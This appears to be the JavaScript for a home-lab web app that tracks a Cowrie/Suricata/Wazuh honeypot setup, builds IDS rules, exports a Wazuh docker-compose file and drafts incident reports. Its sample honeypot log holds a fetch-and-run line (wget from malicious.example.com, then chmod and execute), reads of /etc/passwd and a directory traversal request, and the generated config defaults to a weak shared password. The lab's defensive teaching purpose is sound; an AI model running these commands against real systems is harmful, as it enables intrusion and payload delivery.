/* =============================================================================
   app.js - Low-Spec SIEM & Honeypot Lab Companion
   Logic for RAM Triage, Rule Builder, Incident Reporter, and Config Exporter
   ============================================================================= */

document.addEventListener('DOMContentLoaded', () => {
  initNavigation();
  initChecklist();
  initRamSimulator();
  initRuleBuilder();
  initComposeCustomizer();
  initIncidentReporter();
  initGuideTabs();
  setupCodeCopying();
});

/* =============================================================================
   1. NAVIGATION MANAGEMENT
   ============================================================================= */
function initNavigation() {
  const navItems = document.querySelectorAll('.nav-item');
  const panels = document.querySelectorAll('.panel');

  navItems.forEach(item => {
    item.addEventListener('click', () => {
      const targetPanelId = item.getAttribute('data-target');
      
      // Update sidebar state
      navItems.forEach(nav => nav.classList.remove('active'));
      item.classList.add('active');

      // Update main panels view
      panels.forEach(panel => {
        panel.classList.remove('active');
        if (panel.id === targetPanelId) {
          panel.classList.add('active');
        }
      });
      
      // Scroll to top
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });
}

/* =============================================================================
   2. INTERACTIVE PHASE & CHECKLIST TRACKER
   ============================================================================= */
const defaultChecklist = [
  { id: 'step-vbox', text: 'Configure VirtualBox settings (KVM, Video RAM, Cores)', phase: 'Phase 1' },
  { id: 'step-swap', text: 'Create and activate 2 GB swapfile on Kali VM', phase: 'Phase 1' },
  { id: 'step-docker', text: 'Install Docker & Docker Compose on Kali VM', phase: 'Phase 1' },
  { id: 'step-cowrie', text: 'Deploy Cowrie honeypot container mapping 2222/2323', phase: 'Phase 2' },
  { id: 'step-test-cowrie', text: 'Simulate local SSH & Telnet connections to Cowrie', phase: 'Phase 2' },
  { id: 'step-hydra', text: 'Decompress rockyou.txt and run Hydra brute force', phase: 'Phase 2' },
  { id: 'step-suricata', text: 'Install Suricata IDS & customize suricata.yaml', phase: 'Phase 3' },
  { id: 'step-rules', text: 'Configure local.rules with core + 4 expanded rules', phase: 'Phase 3' },
  { id: 'step-wazuh', text: 'Deploy JVM-optimized Wazuh Docker single-node stack', phase: 'Phase 4' },
  { id: 'step-wazuh-agent', text: 'Install and configure Wazuh Agent on Kali host', phase: 'Phase 4' },
  { id: 'step-forwarding', text: 'Edit ossec.conf to forward Cowrie + Suricata logs', phase: 'Phase 4' },
  { id: 'step-scen-1', text: 'Execute Scenario 1 (SSH Brute Force) & record logs', phase: 'Phase 5' },
  { id: 'step-scen-2', text: 'Execute Scenario 2 (Post-Exploitation) & capture actions', phase: 'Phase 5' },
  { id: 'step-scen-3', text: 'Execute Scenario 3 (Directory Traversal / Web Shell)', phase: 'Phase 5' },
  { id: 'step-scen-4', text: 'Execute Scenario 4 (Nmap Scan / Recon detection)', phase: 'Phase 5' },
  { id: 'step-dashboard', text: 'Build Wazuh custom dashboard visualizing attacks', phase: 'Phase 5' },
  { id: 'step-github', text: 'Create GitHub repository with setup guides & reports', phase: 'Phase 6' },
  { id: 'step-resume', text: 'Add low-spec optimization engineering bullet points to resume', phase: 'Phase 6' }
];

function initChecklist() {
  const container = document.getElementById('checklist-items');
  if (!container) return;

  // Load from LocalStorage
  let storedStates = {};
  try {
    storedStates = JSON.parse(localStorage.getItem('siem_lab_checklist')) || {};
  } catch (e) {
    storedStates = {};
  }

  container.innerHTML = '';
  
  defaultChecklist.forEach(item => {
    const isChecked = storedStates[item.id] || false;
    
    const div = document.createElement('div');
    div.className = `checklist-item ${isChecked ? 'checked' : ''}`;
    div.setAttribute('data-id', item.id);
    div.innerHTML = `
      <div class="checklist-checkbox">
        <svg viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" /></svg>
      </div>
      <span class="checklist-label">${item.text}</span>
      <span class="checklist-phase">${item.phase}</span>
    `;

    div.addEventListener('click', () => {
      const id = div.getAttribute('data-id');
      const currentlyChecked = div.classList.contains('checked');
      
      if (currentlyChecked) {
        div.classList.remove('checked');
        storedStates[id] = false;
      } else {
        div.classList.add('checked');
        storedStates[id] = true;
      }
      
      localStorage.setItem('siem_lab_checklist', JSON.stringify(storedStates));
      updateProgressPill();
    });

    container.appendChild(div);
  });

  updateProgressPill();
}

function updateProgressPill() {
  let storedStates = {};
  try {
    storedStates = JSON.parse(localStorage.getItem('siem_lab_checklist')) || {};
  } catch (e) {}

  const total = defaultChecklist.length;
  const completed = Object.keys(storedStates).filter(key => storedStates[key] === true).length;
  const percent = total > 0 ? Math.round((completed / total) * 100) : 0;

  const progressPill = document.getElementById('progress-pill');
  if (progressPill) {
    progressPill.textContent = `${completed}/${total} Tasks (${percent}%)`;
    progressPill.className = `badge ${percent === 100 ? 'success' : percent > 50 ? 'warning' : ''}`;
  }
}

/* =============================================================================
   3. RAM TRIAGE SIMULATOR
   ============================================================================= */
function initRamSimulator() {
  const ramBar = document.getElementById('ram-bar');
  const ramText = document.getElementById('ram-text');
  const adviceContent = document.getElementById('triage-advice');
  const toggles = document.querySelectorAll('.ram-toggle-switch');

  const ramAllocations = {
    kali_gui: 450,
    cowrie: 180,
    suricata_idle: 120,
    suricata_active: 380,
    wazuh_indexer: 750,
    wazuh_manager: 280,
    wazuh_dashboard: 320,
    firefox: 450,
    hydra: 150,
    metasploit: 350
  };

  const calculateRam = () => {
    let vmTotal = 0;
    let indexerOn = false;
    let hydraOn = false;
    let firefoxOn = false;
    let suricataActive = false;
    let suricataIdle = false;

    toggles.forEach(toggle => {
      if (toggle.checked) {
        const key = toggle.getAttribute('data-ram-key');
        
        if (key === 'suricata') {
          // Check Suricata Mode radio-like states
          const suricataMode = document.querySelector('input[name="suricata-mode"]:checked').value;
          if (suricataMode === 'idle') {
            vmTotal += ramAllocations.suricata_idle;
            suricataIdle = true;
          } else if (suricataMode === 'active') {
            vmTotal += ramAllocations.suricata_active;
            suricataActive = true;
          }
        } else {
          vmTotal += ramAllocations[key] || 0;
          if (key === 'wazuh_indexer') indexerOn = true;
          if (key === 'hydra') hydraOn = true;
          if (key === 'firefox') firefoxOn = true;
        }
      }
    });

    const maxVM = 4096; // 4 GB VM Ceiling
    const percent = Math.min((vmTotal / maxVM) * 100, 100);

    // Update Progress Bar
    ramBar.style.width = `${percent}%`;
    ramText.textContent = `Inside VM: ${vmTotal} MB / ${maxVM} MB (${Math.round(percent)}%)`;

    // Colors based on stress levels
    ramBar.className = 'ram-bar-fill';
    if (percent >= 90) {
      ramBar.classList.add('danger');
    } else if (percent >= 70) {
      ramBar.classList.add('warning');
    }

    // Dynamic Advice Logic
    let adviceHtml = '';
    
    if (vmTotal === ramAllocations.kali_gui) {
      adviceHtml = `
        <div style="color: var(--accent-green); font-weight: 600; margin-bottom: 0.5rem;">[+] VM Clean Slate</div>
        <p>Your VM is idle. Only the lightweight XFCE desktop is running (~450 MB). This is the perfect baseline. You have ample room to start containers.</p>
      `;
    } else if (percent >= 92) {
      adviceHtml = `
        <div style="color: var(--accent-red); font-weight: 700; margin-bottom: 0.5rem; animation: pulse 1.5s infinite;">[🚨 Critical Warning: Out-Of-Memory Risk!]</div>
        <p>Your current active workload is <strong>${vmTotal} MB</strong>. You are at severe risk of freezing your Kali Linux desktop.</p>
        <ul style="margin-left: 1.25rem; margin-top: 0.5rem; display: flex; flex-direction: column; gap: 0.25rem;">
          <li><strong>Recommendation 1:</strong> Close Firefox inside the Kali VM. You can access the Wazuh Dashboard directly from your Windows Host at <a href="https://localhost" target="_blank" style="color: var(--accent-cyan);">https://localhost</a> since the ports are bridged! Saves ~450 MB.</li>
          <li><strong>Recommendation 2:</strong> Shutdown the Wazuh Container Stack before executing brute-force Hydra attacks. Stagger operations to protect the i3 CPU.</li>
        </ul>
      `;
    } else if (indexerOn && hydraOn) {
      adviceHtml = `
        <div style="color: var(--accent-amber); font-weight: 600; margin-bottom: 0.5rem;">[⚠️ Caution: High Resource Concurrency]</div>
        <p>You have running active attacks (Hydra) simultaneously with Wazuh Indexer. This causes high CPU scheduling load on your Intel i3, causing heat throttling.</p>
        <p style="margin-top: 0.5rem;"><strong>Best Practice:</strong> Decouple offensive scans from index operations. Generate Cowrie log records first, stop Wazuh, then start it to index logs after attacks complete.</p>
      `;
    } else if (firefoxOn && (indexerOn || wazuh_dashboard)) {
      adviceHtml = `
        <div style="color: var(--accent-cyan); font-weight: 600; margin-bottom: 0.5rem;">[💡 Optimization Available]</div>
        <p>You are running the Wazuh dashboard alongside Firefox inside the VM. Firefox inside Kali is heavy.</p>
        <p style="margin-top: 0.5rem;"><strong>Host Offloading:</strong> Access the Wazuh Dashboard from your Windows 11 host browser (Chrome/Edge) instead. Windows handles browser RAM allocations much better than your 4GB VM allocates to a Linux browser.</p>
      `;
    } else {
      adviceHtml = `
        <div style="color: var(--accent-green); font-weight: 600; margin-bottom: 0.5rem;">[✅ Healthy Memory Layout]</div>
        <p>Current allocation of <strong>${vmTotal} MB</strong> is stable. Keep monitoring operations.</p>
        <p style="margin-top: 0.5rem;">Remember, the 2 GB swap file we configured operates as an insurance policy against crashes, but keeping native physical RAM usage below 90% keeps the UI highly responsive.</p>
      `;
    }

    adviceContent.innerHTML = adviceHtml;
  };

  // Add listeners
  toggles.forEach(toggle => toggle.addEventListener('change', calculateRam));
  
  // Listen to Suricata sub-modes
  document.querySelectorAll('input[name="suricata-mode"]').forEach(radio => {
    radio.addEventListener('change', () => {
      // Ensure Suricata main switch is toggled on if changing mode
      document.getElementById('toggle-suricata').checked = true;
      calculateRam();
    });
  });

  // Init
  calculateRam();
}

/* =============================================================================
   4. DYNAMIC SURICATA RULE BUILDER
   ============================================================================= */
function initRuleBuilder() {
  const protocol = document.getElementById('rule-proto');
  const srcIp = document.getElementById('rule-src-ip');
  const srcPort = document.getElementById('rule-src-port');
  const dstIp = document.getElementById('rule-dst-ip');
  const dstPort = document.getElementById('rule-dst-port');
  const msg = document.getElementById('rule-msg');
  const sid = document.getElementById('rule-sid');
  const rev = document.getElementById('rule-rev');
  const thresholdType = document.getElementById('rule-thresh-type');
  const threshCount = document.getElementById('rule-thresh-count');
  const threshSec = document.getElementById('rule-thresh-sec');
  const outputBox = document.getElementById('rule-output');

  // Toggle threshold inputs visibility
  const updateThresholdFields = () => {
    const isThreshold = thresholdType.value !== 'none';
    document.getElementById('thresh-count-group').style.opacity = isThreshold ? '1' : '0.4';
    threshCount.disabled = !isThreshold;
    threshSec.disabled = !isThreshold;
  };

  const generateRule = () => {
    const protoVal = protocol.value;
    const srcIpVal = srcIp.value || 'any';
    const srcPortVal = srcPort.value || 'any';
    const dstIpVal = dstIp.value || '$HOME_NET';
    const dstPortVal = dstPort.value || 'any';
    const msgVal = msg.value || 'Custom Attack Event';
    const sidVal = sid.value || '9000009';
    const revVal = rev.value || '1';
    
    let thresholdStr = '';
    if (thresholdType.value !== 'none') {
      const count = threshCount.value || '5';
      const sec = threshSec.value || '60';
      thresholdStr = ` threshold:type ${thresholdType.value}, track by_src, count ${count}, seconds ${sec};`;
    }

    let flowStr = '';
    if (protoVal === 'http') {
      flowStr = ' flow:to_server;';
    }

    // Assemble Suricata structure
    const rule = `alert ${protoVal === 'http' ? 'tcp' : protoVal} ${srcIpVal} ${srcPortVal} -> ${dstIpVal} ${dstPortVal} (msg:"${msgVal}";${flowStr}${thresholdStr} classtype:attempted-admin; sid:${sidVal}; rev:${revVal};)`;
    outputBox.textContent = rule;
  };

  const inputs = [protocol, srcIp, srcPort, dstIp, dstPort, msg, sid, rev, thresholdType, threshCount, threshSec];
  inputs.forEach(input => {
    if (input) input.addEventListener('input', generateRule);
  });

  if (thresholdType) {
    thresholdType.addEventListener('change', () => {
      updateThresholdFields();
      generateRule();
    });
  }

  // Pre-load default rules buttons
  const loadPreset = (preset) => {
    if (preset === 'sqli') {
      protocol.value = 'http';
      srcIp.value = 'any';
      srcPort.value = 'any';
      dstIp.value = '$HOME_NET';
      dstPort.value = 'any';
      msg.value = 'SQL Injection Attempt - Union Query';
      sid.value = '9000010';
      rev.value = '1';
      thresholdType.value = 'none';
    } else if (preset === 'revshell') {
      protocol.value = 'tcp';
      srcIp.value = '$HOME_NET';
      srcPort.value = 'any';
      dstIp.value = 'any';
      dstPort.value = 'any';
      msg.value = 'Outbound Reverse Shell Prompt Connection';
      sid.value = '9000011';
      rev.value = '1';
      thresholdType.value = 'none';
    } else if (preset === 'traverse') {
      protocol.value = 'http';
      srcIp.value = 'any';
      srcPort.value = 'any';
      dstIp.value = '$HOME_NET';
      dstPort.value = 'any';
      msg.value = 'HTTP Directory Traversal /etc/passwd';
      sid.value = '9000012';
      rev.value = '1';
      thresholdType.value = 'none';
    }
    updateThresholdFields();
    generateRule();
  };

  document.querySelectorAll('.preset-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      loadPreset(btn.getAttribute('data-preset'));
    });
  });

  // Initial trigger
  if (outputBox) {
    updateThresholdFields();
    generateRule();
  }
}

/* =============================================================================
   5. WAZUH DOCKER-COMPOSE EXPORTER
   ============================================================================= */
function initComposeCustomizer() {
  const heapVal = document.getElementById('comp-heap');
  const passwordVal = document.getElementById('comp-pass');
  const outputBox = document.getElementById('compose-output');
  const downloadBtn = document.getElementById('download-compose-btn');

  const generateYaml = () => {
    const heap = heapVal.value || '512m';
    const password = passwordVal.value || 'SecretPassword123!';

    const yaml = `# -----------------------------------------------------------------------------
# File: docker-compose.yml (Low-Spec Single Node Wazuh v4.8.0)
# Generated dynamically via SIEM Lab Companion
# -----------------------------------------------------------------------------

version: '3.8'

services:
  wazuh-indexer:
    image: wazuh/wazuh-indexer:4.8.0
    container_name: wazuh.indexer
    hostname: wazuh-indexer
    restart: unless-stopped
    ports:
      - "9200:9200"
    environment:
      # Scales down Java heap to prevent out-of-memory crashes
      - OPENSEARCH_JAVA_OPTS=-Xms${heap} -Xmx${heap} -XX:MaxDirectMemorySize=512m
      - bootstrap.memory_lock=false
      - discovery.type=single-node
      - cluster.name=wazuh-cluster
      - node.name=wazuh-indexer
      - PATH_CONF=/usr/share/wazuh-indexer/config
      - INDEXER_PASSWORD=${password}
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./config/wazuh_indexer/wazuh-indexer.yml:/usr/share/wazuh-indexer/config/wazuh-indexer.yml
      - ./config/wazuh_indexer/certs/:/usr/share/wazuh-indexer/config/certs/
    networks:
      - wazuh-net

  wazuh-manager:
    image: wazuh/wazuh-manager:4.8.0
    container_name: wazuh.manager
    hostname: wazuh-manager
    restart: unless-stopped
    ports:
      - "1514:1514"
      - "1515:1515"
      - "55000:55000"
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USER=admin
      - INDEXER_PASSWORD=${password}
      - FILEBEAT_SSL_VERIFY_HOST=false
    volumes:
      - wazuh-manager-data:/var/ossec/data
      - ./config/wazuh_manager/certs/:/var/ossec/etc/certs/
    networks:
      - wazuh-net

  wazuh-dashboard:
    image: wazuh/wazuh-dashboard:4.8.0
    container_name: wazuh.dashboard
    hostname: wazuh-dashboard
    restart: unless-stopped
    ports:
      - "443:5601"
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USER=admin
      - INDEXER_PASSWORD=${password}
      - WAZUH_MANAGER_URL=https://wazuh-manager:55000
      - DASHBOARD_USERNAME=admin
      - DASHBOARD_PASSWORD=${password}
      - API_USERNAME=admin
      - API_PASSWORD=${password}
    volumes:
      - wazuh-dashboard-data:/usr/share/wazuh-dashboard/data
      - ./config/wazuh_dashboard/certs/:/usr/share/wazuh-dashboard/config/certs/
      - ./config/wazuh_dashboard/wazuh.yml:/usr/share/wazuh-dashboard/config/wazuh.yml
    networks:
      - wazuh-net

volumes:
  wazuh-indexer-data:
  wazuh-manager-data:
  wazuh-dashboard-data:

networks:
  wazuh-net:
    driver: bridge`;

    outputBox.textContent = yaml;
  };

  const handleDownload = () => {
    const yaml = outputBox.textContent;
    const blob = new Blob([yaml], { type: 'text/yaml' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'docker-compose.yml';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  if (heapVal && passwordVal) {
    heapVal.addEventListener('change', generateYaml);
    passwordVal.addEventListener('input', generateYaml);
    downloadBtn.addEventListener('click', handleDownload);
    generateYaml();
  }
}

/* =============================================================================
   6. PORTFOLIO INCIDENT REPORT GENERATOR
   ============================================================================= */
function initIncidentReporter() {
  const scenarioSelect = document.getElementById('rep-scen');
  const attackerIp = document.getElementById('rep-attacker');
  const targetIp = document.getElementById('rep-target');
  const timestamp = document.getElementById('rep-time');
  const evidenceText = document.getElementById('rep-evidence');
  const mitigationText = document.getElementById('rep-mitigations');
  const previewDiv = document.getElementById('report-preview');
  const downloadBtn = document.getElementById('download-report-btn');

  const presetLogs = {
    ssh: `2026-05-26T18:45:10.124Z ssh_brute_force login attempt failed: root/admin from 192.168.0.45\n2026-05-26T18:45:11.350Z ssh_brute_force login attempt failed: root/password from 192.168.0.45\n2026-05-26T18:45:12.782Z ssh_brute_force login attempt failed: root/123456 from 192.168.0.45\n2026-05-26T18:45:14.004Z ssh_brute_force login attempt failed: root/guest from 192.168.0.45\n2026-05-26T18:45:15.221Z ssh_brute_force login attempt failed: root/security from 192.168.0.45`,
    post: `[Cowrie Honeypot SSH Session #4901]\n- Attacker entered terminal from 192.168.0.45\n- Input: whoami (Response: root)\n- Input: cat /etc/passwd (Response: output file)\n- Input: wget http://malicious.example.com/payload\n- Input: chmod +x payload && ./payload`,
    traverse: `[Suricata IDS Alert] msg: "HTTP Directory Traversal Attempt Detected"\nSRC: 192.168.0.45:51342 -> DST: 127.0.0.1:80 (HTTP)\nPAYLOAD: GET /?q=../../../../etc/passwd HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n`,
    nmap: `[Suricata IDS Alert] msg: "Nmap TCP Scan Detected"\nSRC: 192.168.0.45 -> DST: 127.0.0.1\nAlert triggered on flag settings: SYN packet scans on consecutive closed/open ports (TCP Stealth Scan)`
  };

  const presetMitigations = {
    ssh: `- Enforce public-key authentication; disable password auth completely.\n- Deploy Fail2Ban or Wazuh active response rules to drop attacker IP after 3 failed connections.\n- Change default SSH listening ports (away from port 22).`,
    post: `- Implement honeypots as sandboxed trap subnets isolated from production environments.\n- Block outbound access from servers (such as wget / curl) to stop malicious payload retrievals.\n- Deploy centralized agent file integrity monitoring (FIM) to track system configurations.`,
    traverse: `- Implement input sanitization on web parameters; strip directory traversal character sequences.\n- Restrict web root folder file access permissions using Linux DAC/ACL controls.\n- Deploy Web Application Firewalls (WAF) to actively drop malformed relative path query URIs.`,
    nmap: `- Configure host iptables/firewalls to limit incoming ICMP or SYN requests.\n- Implement ports-knocking protocols or isolate management ports on dedicated VPN networks.\n- Enable active IDS alert blocks to blackhole persistent port scanners.`
  };

  const handleScenarioChange = () => {
    const scen = scenarioSelect.value;
    evidenceText.value = presetLogs[scen] || '';
    mitigationText.value = presetMitigations[scen] || '';
    
    // Set auto timestamp
    const now = new Date();
    timestamp.value = now.toISOString().replace('T', ' ').substring(0, 19);
    
    generateReport();
  };

  const generateReport = () => {
    const scenName = scenarioSelect.options[scenarioSelect.selectedIndex].text;
    const attacker = attackerIp.value || '192.168.0.45';
    const target = targetIp.value || '127.0.0.1 (Honeypot/Kali)';
    const time = timestamp.value;
    const logs = evidenceText.value;
    const mitigations = mitigationText.value;

    const md = `# Cybersecurity Incident Report: ${scenName}

## 1. Executive Summary
On **${time}**, our network security monitoring services registered active anomalous behaviors targeting core assets. This incident was immediately logged by our local intrusion detection and honeypot collectors, then aggregated and flagged on the central **Wazuh SIEM Dashboard**.

---

## 2. Threat Vector Details
*   **Incident Type**: ${scenName}
*   **Threat Origin IP**: \`${attacker}\`
*   **Victim Host Target**: \`${target}\`
*   **Timestamp**: \`${time}\`

---

## 3. Log Evidence & Indicators of Compromise (IoC)
The following events were captured in real-time by security daemons and forwarded for centralized analysis:

\`\`\`text
${logs}
\`\`\`

---

## 4. Analysis & Impact Assessment
*   **Classification**: Attempted System Intrusion / Policy Violation.
*   **Impact Level**: Low-Medium (Isolated to sandboxed honeypot layers; no production assets exposed).
*   **Discovery Path**: Suricata Signature rules and Cowrie API loggers registered anomalous payloads, triggering correlation alerts on the SIEM interface.

---

## 5. Mitigation & Hardening Roadmap
To defend production layers from identical threats, the following active countermeasures are scheduled:

${mitigations}

---
*Report compiled automatically on ${new Date().toLocaleDateString()} via SIEM Lab Companion.*`;

    // Simple markdown renderer for preview box
    let html = md
      .replace(/# (.*)/g, '<h1>$1</h1>')
      .replace(/## (.*)/g, '<h2>$1</h2>')
      .replace(/---/g, '<hr style="border: none; border-bottom: 1px solid rgba(255,255,255,0.08); margin: 1rem 0;">')
      .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
      .replace(/`([^`]+)`/g, '<code>$1</code>')
      .replace(/\n\n/g, '<p></p>')
      .replace(/(\* .*)/g, '<ul><li>$1</li></ul>')
      .replace(/<\/ul><ul>/g, '')
      .replace(/<li>\* (.*)/g, '<li>$1')
      .replace(/```text\n([^`]+)```/g, '<pre><code>$1</code></pre>');

    previewDiv.innerHTML = html;
  };

  const handleDownload = () => {
    // Generate text raw markdown
    const attacker = attackerIp.value || '192.168.0.45';
    const target = targetIp.value || '127.0.0.1';
    const time = timestamp.value;
    const logs = evidenceText.value;
    const mitigations = mitigationText.value;
    const scenName = scenarioSelect.options[scenarioSelect.selectedIndex].text;

    const rawMd = `# Cybersecurity Incident Report: ${scenName}
# Generated via SIEM Lab Companion

## 1. Executive Summary
On **${time}**, our network security monitoring services registered active anomalous behaviors targeting core assets. This incident was immediately logged by our local intrusion detection and honeypot collectors, then aggregated and flagged on the central **Wazuh SIEM Dashboard**.

## 2. Threat Vector Details
*   **Incident Type**: ${scenName}
*   **Threat Origin IP**: ${attacker}
*   **Victim Host Target**: ${target}
*   **Timestamp**: ${time}

## 3. Log Evidence & Indicators of Compromise (IoC)
\`\`\`text
${logs}
\`\`\`

## 4. Analysis & Impact Assessment
*   **Classification**: Attempted System Intrusion / Policy Violation.
*   **Impact Level**: Low-Medium (Sandboxed Honeypot).
*   **Discovery Path**: Suricata Rules & Cowrie logs forwarded to Wazuh.

## 5. Mitigation & Hardening Roadmap
${mitigations}
`;

    const blob = new Blob([rawMd], { type: 'text/markdown' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `incident_report_${scenarioSelect.value}.md`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  if (scenarioSelect) {
    scenarioSelect.addEventListener('change', handleScenarioChange);
    
    const inputs = [attackerIp, targetIp, timestamp, evidenceText, mitigationText];
    inputs.forEach(input => input.addEventListener('input', generateReport));
    
    downloadBtn.addEventListener('click', handleDownload);
    
    // Fire init state
    handleScenarioChange();
  }
}

/* =============================================================================
   7. GUIDEBOOK NAVIGATION
   ============================================================================= */
function initGuideTabs() {
  const guideBtns = document.querySelectorAll('.guide-nav-item');
  const sections = document.querySelectorAll('.guide-section');

  guideBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const target = btn.getAttribute('data-guide-target');
      
      guideBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      sections.forEach(sec => {
        sec.classList.remove('active');
        if (sec.id === target) {
          sec.classList.add('active');
        }
      });
    });
  });
}

/* =============================================================================
   8. CODE COPYING HANDLER
   ============================================================================= */
function setupCodeCopying() {
  document.querySelectorAll('.code-copy-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.getAttribute('data-target-id');
      const targetElem = document.getElementById(targetId);
      if (!targetElem) return;

      const codeText = targetElem.textContent || targetElem.value;
      navigator.clipboard.writeText(codeText.trim()).then(() => {
        // Success feedback
        const origText = btn.innerHTML;
        btn.innerHTML = `<svg style="width: 14px; height: 14px; stroke: currentColor; fill:none;" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12"/></svg> Copied!`;
        btn.classList.add('copied');

        setTimeout(() => {
          btn.innerHTML = origText;
          btn.classList.remove('copied');
        }, 1500);
      }).catch(err => {
        console.error('Failed to copy to clipboard', err);
      });
    });
  });
}
